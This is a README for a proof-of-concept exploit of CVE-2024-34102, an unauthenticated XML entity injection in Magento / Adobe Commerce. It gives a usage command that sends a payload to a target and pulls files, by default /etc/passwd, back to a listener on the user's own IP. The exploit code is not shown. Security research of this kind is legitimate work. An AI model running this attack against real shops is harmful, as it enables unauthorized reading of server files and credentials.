# CVE-2024-34102
POC for CVE-2024-34102. A pre-authentication XML entity injection issue in Magento / Adobe Commerce. 


## Overview

This is a proof-of-concept (PoC) for that will atempt to read files from target hosts that are vulnerable to CVE-2024-34102.

![Banner](screens/screen.jpg)


## How to Use

In order to run this poc, you will have to have a machine with published and accessible IP. This POC will attempt to localy create a poc.xml file containing the payloads, sends a POST a request to the target, temporary open http server to listen to GET requests from the target and then reads files from the target machine.

### Minimum Requirements

- Python 3.6 or higher
- `requests` library
  
To use this POC against a single target:
```sh
python cve-2024-34102.py -u hostname -ip your-machine-ip -p any-open-port-in-your-machine -r file-to-read-from-target (default is /etc/passwd)
```

## Author

POC was created by [M Ali](https://x.com/MohamedNab1l).

## Disclaimer

This provided tool is for educational purposes only. I do not encourage, condone, or support unauthorized access to any system or network. Use this tool responsibly and only on systems you have explicit permission to test. Any actions and consequences resulting from misuse of this tool are your own responsibility.

## References
- https://github.com/spacewasp/public_docs/blob/main/CVE-2024-34102.md
- https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102
